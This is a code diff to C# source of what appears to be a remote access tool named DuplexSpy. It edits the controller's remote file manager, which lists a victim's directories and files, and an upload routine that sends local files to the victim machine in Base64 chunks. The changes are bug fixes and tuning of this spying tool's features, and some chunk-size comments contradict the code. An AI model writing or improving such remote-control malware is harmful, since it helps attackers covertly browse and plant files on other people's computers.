@@ -880,6 +880,9 @@ namespace DuplexSpyCS
             //To avoid display item in wrong directory.
             Invoke(new Action(() =>
             {
+                if (treeView1.SelectedNode == null)
+                    return;
+
                 if (tgt_dir != treeView1.SelectedNode.FullPath)
                     return;
             }));
@@ -921,130 +924,145 @@ namespace DuplexSpyCS
                 //Directory
                 int cnt_dir = 0;
                 int cnt_file = 0;
-                foreach (string dir in d1.Split("+"))
+                foreach (string dir in d1.Split("*"))
                 {
-                    string[] s = dir.Split(";");
-                    string name = Path.GetFileName(s[0]);
-                    if (string.IsNullOrEmpty(name))
-                        continue;
-
-                    ListViewItem item = new ListViewItem(name);
-                    item.ImageKey = "folder";
-                    item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
-                        .Select((x, idx) => new { x, idx }).
-                        Where(x => x.idx != 0).
-                        Select(x => x.x)
-                        .ToArray());
-
-                    //Check Error
-                    if (item.SubItems.Count < listView1.Columns.Count)
-                        continue;
-                    if (string.IsNullOrEmpty(item.SubItems[1].Text))
-                        continue;
-
-                    item.Tag = new object[] { s[0], "d" };
-                    Invoke(new Action(() =>
+                    try
                     {
-                        listView1.Items.Add(item);
+                        string[] s = dir.Split(";");
 
-                        bool bItemExist = false;
-                        bItemExist = FindTreeNodeByFullPath(treeView1.Nodes, s[0]) != null;
+                        string name = Path.GetFileName(s[0]);
+                        if (string.IsNullOrEmpty(name))
+                            continue;
 
-                        string path = Path.Combine(current_path, name);
+                        ListViewItem item = new ListViewItem(name);
+                        item.ImageKey = "folder";
+                        item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
+                            .Select((x, idx) => new { x, idx }).
+                            Where(x => x.idx != 0).
+                            Select(x => x.x)
+                            .ToArray());
 
-                        if (FindTreeNodeByFullPath(treeView1.Nodes, path) == null)
+                        //Check Error
+                        if (item.SubItems.Count < listView1.Columns.Count)
+                            continue;
+                        if (string.IsNullOrEmpty(item.SubItems[1].Text))
+                            continue;
+
+                        item.Tag = new object[] { s[0], "d" };
+                        Invoke(new Action(() =>
                         {
-                            TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
-                            if (node == null)
-                            {
-                                TreeNode driverNode = FindTreeNodeByFullPath(treeView1.Nodes, current_path.Split("\\")[0]);
-                                RecursionAddTreeNodePath(current_path.Split("\\"), driverNode);
-                                node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
-                            }
+                            listView1.Items.Add(item);
 
-                            int idx = -1;
-                            if (node != null)
+                            bool bItemExist = false;
+                            bItemExist = FindTreeNodeByFullPath(treeView1.Nodes, s[0]) != null;
+
+                            string path = Path.Combine(current_path, name);
+
+                            if (FindTreeNodeByFullPath(treeView1.Nodes, path) == null)
                             {
-                                if (node.Nodes.Count > 0)
+                                TreeNode node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
+                                if (node == null)
                                 {
-                                    for (int i = 0; i < node.Nodes.Count; i++)
+                                    TreeNode driverNode = FindTreeNodeByFullPath(treeView1.Nodes, current_path.Split("\\")[0]);
+                                    RecursionAddTreeNodePath(current_path.Split("\\"), driverNode);
+                                    node = FindTreeNodeByFullPath(treeView1.Nodes, current_path);
+                                }
+
+                                int idx = -1;
+                                if (node != null)
+                                {
+                                    if (node.Nodes.Count > 0)
                                     {
-                                        TreeNode child = node.Nodes[i];
-                                        if (string.Compare(name, child.Text) > 0) //new item follow child
+                                        for (int i = 0; i < node.Nodes.Count; i++)
                                         {
-                                            idx = i + 1;
-                                        }
-                                        else
-                                        {
-                                            idx = i;
-                                            break;
+                                            TreeNode child = node.Nodes[i];
+                                            if (string.Compare(name, child.Text) > 0) //new item follow child
+                                            {
+                                                idx = i + 1;
+                                            }
+                                            else
+                                            {
+                                                idx = i;
+                                                break;
+                                            }
                                         }
                                     }
+                                    idx = idx == -1 ? 0 : idx;
+                                    TreeNode new_node = new TreeNode(name);
+                                    node.Nodes.Insert(idx, new_node);
+                                    new_node.ImageIndex = 0;
+                                    new_node.EnsureVisible();
+                                    node.Expand();
                                 }
-                                idx = idx == -1 ? 0 : idx;
-                                TreeNode new_node = new TreeNode(name);
-                                node.Nodes.Insert(idx, new_node);
-                                new_node.ImageIndex = 0;
-                                new_node.EnsureVisible();
-                                node.Expand();
+                                else
+                                {
+                                    //MessageBox.Show(current_path);
+                                }
                             }
-                            else
-                            {
-                                //MessageBox.Show(current_path);
-                            }
-                        }
 
-                        lsCheckDeletedDir.Add(name);
-                    }));
-                    cnt_dir++;
+                            lsCheckDeletedDir.Add(name);
+                        }));
+                        cnt_dir++;
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
                 RemoveDeleted();
 
                 //File
-                foreach (string file in d2.Split("+"))
+                foreach (string file in d2.Split("*"))
                 {
-                    string[] s = file.Split(";");
-                    if (string.IsNullOrEmpty(s[0]))
-                        continue;
-
-                    bool bItemExist = false;
-                    Invoke(new Action(() =>
+                    try
                     {
-                        foreach (ListViewItem item in listView1.Items)
+                        string[] s = file.Split(";");
+                        if (string.IsNullOrEmpty(s[0]))
+                            continue;
+
+                        bool bItemExist = false;
+                        Invoke(new Action(() =>
                         {
-                            if (string.Compare(Path.GetFileName(s[0]), item.Text) == 0)
+                            foreach (ListViewItem item in listView1.Items)
                             {
-                                bItemExist = true;
-                                break;
+                                if (string.Compare(Path.GetFileName(s[0]), item.Text) == 0)
+                                {
+                                    bItemExist = true;
+                                    break;
+                                }
                             }
-                        }
-                    }));
+                        }));
 
-                    if (bItemExist)
-                        continue;
+                        if (bItemExist)
+                            continue;
 
-                    ListViewItem item = new ListViewItem(Path.GetFileName(s[0]));
-                    item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
-                        .Select((x, idx) => new { x, idx }).
-                        Where(x => x.idx != 0).
-                        Select(x => x.x)
-                        .ToArray());
-                    item.Tag = new object[] { s[0], "f" };
-                    string ext = Path.GetExtension(s[0]);
-                    Invoke(new Action(() =>
-                    {
-                        if (!clsStore.il_extension.Images.ContainsKey(ext))
+                        ListViewItem item = new ListViewItem(Path.GetFileName(s[0]));
+                        item.SubItems.AddRange(s.Select(x => new ListViewItem.ListViewSubItem() { Text = x })
+                            .Select((x, idx) => new { x, idx }).
+                            Where(x => x.idx != 0).
+                            Select(x => x.x)
+                            .ToArray());
+                        item.Tag = new object[] { s[0], "f" };
+                        string ext = Path.GetExtension(s[0]);
+                        Invoke(new Action(() =>
                         {
-                            string temp_file = Path.GetTempPath() + Guid.NewGuid().ToString() + $"{ext}";
-                            File.Create(temp_file).Close();
-                            Icon icon = Icon.ExtractAssociatedIcon(temp_file);
-                            File.Delete(temp_file);
-                            clsStore.il_extension.Images.Add(ext, icon);
-                        }
-                    }));
-                    item.ImageKey = ext;
-                    Invoke(new Action(() => listView1.Items.Add(item)));
-                    cnt_file++;
+                            if (!clsStore.il_extension.Images.ContainsKey(ext))
+                            {
+                                string temp_file = Path.GetTempPath() + Guid.NewGuid().ToString() + $"{ext}";
+                                File.Create(temp_file).Close();
+                                Icon icon = Icon.ExtractAssociatedIcon(temp_file);
+                                File.Delete(temp_file);
+                                clsStore.il_extension.Images.Add(ext, icon);
+                            }
+                        }));
+                        item.ImageKey = ext;
+                        Invoke(new Action(() => listView1.Items.Add(item)));
+                        cnt_file++;
+                    }
+                    catch (Exception ex)
+                    {
+                        MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    }
                 }
 
                 if (cnt_dir < nTotalDir)
@@ -1199,31 +1217,35 @@ namespace DuplexSpyCS
 
                 string filename = path[1];
                 string tgt_filename = Path.Combine(tgt_dir, Path.GetFileName(filename));
-                int chunk_size = 1024 * 10; //5 KB
+                int chunk_size = 1024 * 1024 * 5; //1 MB
 
                 using (FileStream fs = new FileStream(filename, FileMode.Open, FileAccess.Read))
                 {
-                    byte[] buffer = new byte[chunk_size];
                     int byte_reads;
 
                     FileInfo info = new FileInfo(filename);
                     long file_len = info.Length;
 
                     int i = 0;
+                    byte[] buffer = new byte[chunk_size];
+                    long totalSent = 0;
+
                     while ((byte_reads = fs.Read(buffer, 0, buffer.Length)) > 0)
                     {
                         if (!g_bUploadFile)
                         {
-                            MessageBox.Show("Stop upload file!", "Signal", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                            MessageBox.Show("Stop upload file!", "Signal",
+                                MessageBoxButtons.OK, MessageBoxIcon.Warning);
                             return;
                         }
+
                         while (g_bUploadPause)
                         {
                             Thread.Sleep(1000);
                         }
 
-                        buffer = buffer[0..byte_reads];
-                        string b64_data = Convert.ToBase64String(buffer);
+                        string b64_data = Convert.ToBase64String(buffer, 0, byte_reads);
+
                         m_victim.fnSendCommand(string.Join("|", new string[]
                         {
                             "file",
@@ -1231,14 +1253,14 @@ namespace DuplexSpyCS
                             szFlag,
                             "recv",
                             clsCrypto.b64E2Str(tgt_filename),
-                            file_len.ToString(), //FILE BYTES LENGTH
-                            (i * chunk_size).ToString(), //OFFSET
-                            b64_data, //BASE-64 FILE DATA
+                            file_len.ToString(),
+                            totalSent.ToString(),
+                            b64_data
                         }));
 
-                        i++;
+                        totalSent += byte_reads;
 
-                        Thread.Sleep(10);
+                        Thread.Sleep(100);
                     }
                 }
             }
